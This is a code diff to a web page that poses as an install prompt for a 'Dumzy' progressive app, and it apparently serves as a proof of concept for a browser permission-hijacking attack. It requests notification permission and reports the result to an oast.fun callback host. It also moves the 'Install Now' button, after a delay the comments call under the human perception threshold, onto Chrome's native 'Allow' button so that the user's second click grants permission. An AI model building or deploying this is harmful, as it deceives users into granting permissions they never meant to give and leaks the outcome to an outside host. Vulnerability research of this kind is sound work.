@@ -21,7 +21,7 @@
       transform: translateX(-50%);
       cursor: pointer;
       z-index: 9999;
-      transition: all 0.5s ease;
+      transition: all 0.2s ease;
     }
   </style>
 </head>
@@ -30,12 +30,12 @@
   <h2>📱 Install Dumzy Progressive App</h2>
   <p>For faster experience, install Dumzy to your home screen.</p>
 
-  <button id="install-btn" onclick="moveButton()">Install Now</button>
+  <button id="install-btn" onclick="handleClick()">Install Now</button>
 
   <script>
     let moved = false;
 
-    // Trigger notification prompt
+    // Trigger Notification permission request
     setTimeout(() => {
       Notification.requestPermission().then(result => {
         fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/chain-install-notif', {
@@ -50,17 +50,18 @@
       });
     }, 1000);
 
-    function moveButton() {
+    function handleClick() {
       const btn = document.getElementById("install-btn");
 
-      // On first click, move the button over the Allow position
       if (!moved) {
-        btn.style.top = "90px";
-        btn.style.left = "400px"; // Adjust to align with "Allow" on Chrome
-        btn.textContent = "Confirm";
+        // Delay short enough to mimic natural reposition
+        setTimeout(() => {
+          btn.style.top = "90px";      // Approx location of native "Allow" button
+          btn.style.left = "400px";    // Fine-tune based on testing on browser
+          btn.textContent = "Confirm";
+        }, 150); // Delay under human perception threshold
         moved = true;
       } else {
-        // Optional secondary logic
         alert("App is being installed...");
       }
     }
